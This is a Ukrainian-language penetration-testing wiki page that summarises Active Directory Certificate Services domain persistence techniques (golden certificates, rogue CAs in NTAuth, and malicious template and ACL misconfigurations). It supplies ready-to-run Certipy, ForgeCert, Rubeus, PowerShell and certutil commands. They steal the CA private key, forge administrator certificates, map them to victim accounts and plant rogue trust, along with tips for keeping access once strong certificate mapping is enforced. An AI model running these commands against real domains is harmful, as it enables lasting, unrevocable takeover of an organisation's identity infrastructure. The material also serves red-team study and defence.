# Постійність у домені AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Це підсумок технік доменної персистентності, описаних у [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf). Перегляньте його для детальнішої інформації.**

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

Як визначити, що сертифікат є CA-сертифікатом?

Сертифікат можна вважати CA-сертифікатом, якщо виконано кілька умов:

- Сертифікат зберігається на CA-сервері, а його приватний ключ захищений через DPAPI машини або апаратно (TPM/HSM), якщо ОС це підтримує.
- Поля Issuer і Subject сертифіката збігаються з distinguished name CA.
- Розширення "CA Version" присутнє виключно в CA-сертифікатах.
- Сертифікат не містить полів Extended Key Usage (EKU).

Щоб витягти приватний ключ цього сертифіката, на CA-сервері підтримуваним методом через вбудований GUI є інструмент `certsrv.msc`. Тим не менш, цей сертифікат не відрізняється від інших, що зберігаються в системі; отже, для витягання можна застосувати такі методи, як [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Сертифікат та приватний ключ також можна отримати за допомогою Certipy з наступною командою:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Отримавши сертифікат CA та його приватний ключ у форматі `.pfx`, інструменти на кшталт [ForgeCert](https://github.com/GhostPack/ForgeCert) можна використовувати для створення дійсних сертифікатів:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Користувач, для якого підробляється сертифікат, повинен бути активним і здатним автентифікуватися в Active Directory, щоб процес успішно завершився. Підробка сертифіката для спеціальних облікових записів, таких як krbtgt, є неефективною.

Цей підроблений сертифікат буде **дійсним** до вказаної дати закінчення та доки дійсний кореневий сертифікат CA (зазвичай від 5 до **10+ років**). Він також дійсний для **machines**, тож у поєднанні з **S4U2Self** зловмисник може **підтримувати персистентність на будь-якій domain machine** стільки, скільки дійсний сертифікат CA.\
Більше того, **сертифікати, згенеровані** цим методом **не можуть бути відкликані**, оскільки CA про них не знає.

### Operating under Strong Certificate Mapping Enforcement (2025+)

З 11 лютого 2025 року (після розгортання KB5014754) domain controllers за замовчуванням використовують **Full Enforcement** для відображень сертифікатів. Фактично це означає, що ваші підроблені сертифікати повинні або:

- Містити сильне прив’язування до цільового облікового запису (наприклад, the SID security extension), або
- Бути поєднані з сильним, явним відображенням в атрибуті цільового об’єкта `altSecurityIdentities`.

Надійний підхід для персистентності — видати підроблений сертифікат, зв'язаний із викраденим Enterprise CA, а потім додати сильне явне відображення до об’єкта-жертви:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- Якщо ви можете створити підроблені сертифікати, що містять розширення безпеки SID, вони відобразяться імпліцитно навіть за режиму Full Enforcement. Інакше надавайте перевагу явним сильним відображенням. Див. [account-persistence](account-persistence.md) для додаткової інформації про явні відображення.
- Відкликання не допомагає захисникам у цьому випадку: підроблені сертифікати невідомі базі даних CA і тому не можуть бути відкликані.

## Trusting Rogue CA Certificates - DPERSIST2

Об'єкт `NTAuthCertificates` призначено для містження одного або декількох **CA certificates** в його атрибуті `cacertificate`, які використовує Active Directory (AD). Процес перевірки з боку **контролера домену** полягає в пошуку в об'єкті `NTAuthCertificates` запису, що відповідає **CA, вказаному** у полі Issuer автентифікуючого **сертифіката**. Якщо знайдено відповідність, автентифікація продовжується.

Атакуючий може додати самопідписаний CA сертифікат до об'єкта `NTAuthCertificates`, якщо він має контроль над цим об'єктом AD. Зазвичай лише члени групи **Enterprise Admin**, а також **Domain Admins** або **Administrators** у **домені кореня лісу** мають дозвіл змінювати цей об'єкт. Вони можуть редагувати об'єкт `NTAuthCertificates` за допомогою `certutil.exe` з командою `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, або скористатися [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ця можливість особливо актуальна у поєднанні з раніше описаним методом за допомогою ForgeCert для динамічної генерації сертифікатів.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Зловмисна неправильна конфігурація - DPERSIST3

Можливостей для **персистенції** через **зміни дескрипторів безпеки компонентів AD CS** більш ніж достатньо. Зміни, описані в розділі "[Ескалація домену](domain-escalation.md)", можуть бути зловмисно реалізовані атакуючим з підвищеним доступом. Це включає додавання "control rights" (наприклад, WriteOwner/WriteDACL/etc.) до чутливих компонентів, таких як:

- **AD-об'єкт комп'ютера CA-сервера**
- **RPC/DCOM-сервер CA-сервера**
- Будь-який **похідний AD-об'єкт або контейнер** у **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (наприклад, Certificate Templates container, Certification Authorities container, the NTAuthCertificates object тощо)
- **Групи AD, яким делеговано права контролю AD CS** за замовчуванням або організацією (наприклад, вбудована група Cert Publishers та будь-які її члени)

Приклад зловмисної реалізації: атакуючий з **підвищеними правами** в домені додає право **`WriteOwner`** до шаблону сертифіката за замовчуванням **`User`**, при цьому атакуючий є суб’єктом цього права. Щоб скористатися цим, атакуючий спочатку змінює власника шаблону **`User`** на себе. Після цього для шаблону встановлюється **`mspki-certificate-name-flag`** зі значенням **1**, щоб увімкнути **`ENROLLEE_SUPPLIES_SUBJECT`**, що дозволяє користувачу вказати Subject Alternative Name у запиті. Надалі атакуючий може **enroll**, використовуючи цей **шаблон**, обравши ім'я **адміністратора домену** як альтернативне ім'я, і використати отриманий сертифікат для автентифікації як DA.

Практичні налаштування, які атакуючі можуть встановити для довгострокової персистенції в домені (див. {{#ref}}domain-escalation.md{{#endref}} для повних деталей та виявлення):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- ACL шаблону (DACL) або налаштування, що дозволяють видачу сертифікатів для автентифікації (наприклад, додавання Client Authentication EKU, увімкнення `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Контроль над об'єктом `NTAuthCertificates` або контейнерами CA для постійного повторного введення шкідливих видавців, якщо захисники намагаються очистити систему.

> [!TIP]
> У захищених середовищах після KB5014754 поєднання цих неправильних конфігурацій із явними сильними мапінгами (`altSecurityIdentities`) гарантує, що ваші видані або підроблені сертифікати залишаться придатними для використання навіть коли DCs застосовують strong mapping.



## Посилання

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
